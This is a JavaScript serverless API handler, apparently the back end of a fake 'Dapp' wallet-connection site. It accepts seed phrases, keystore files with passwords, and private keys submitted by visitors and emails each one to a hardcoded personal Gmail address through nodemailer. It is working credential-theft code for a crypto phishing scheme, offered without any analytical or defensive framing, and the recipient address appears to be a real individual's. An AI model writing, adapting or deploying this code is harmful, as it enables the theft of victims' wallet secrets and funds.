import nodemailer from "nodemailer";

function formatMessage(message) {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map(
    (line) => `<div style="margin-bottom: 10px;">${line}</div>`
  );
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedLines.join("")}</div>`;
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { phrase, keystore, privateKey, item } = req.body;
  const email = process.env.EMAIL_USER || "";
  const pass = process.env.EMAIL_PASS || "";

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: email, pass },
  });

  try {
    await transporter.verify();

    let mailOptions;
    if (phrase) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Phrase Submission",
        html: `${formatMessage(phrase)} <br/> Wallet: ${item}`,
      };
    } else if (keystore) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Keystore Submission",
        html: `<div>Json: ${keystore.json}</div>
               <div>Password: ${keystore.password}</div>
               Wallet: ${item}`,
      };
    } else if (privateKey) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Private Key Submission",
        html: `${formatMessage(privateKey)} <br/> Wallet: ${item}`,
      };
    }

    if (!mailOptions) {
      return res.status(400).json({ message: "Submission Failed (empty body)" });
    }

    const result = await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: "Email sent successfully!", result });
  } catch (error) {
    console.error("Mail error:", error);
    return res.status(500).json({ error: "Internal server error", details: error.message });
  }
}
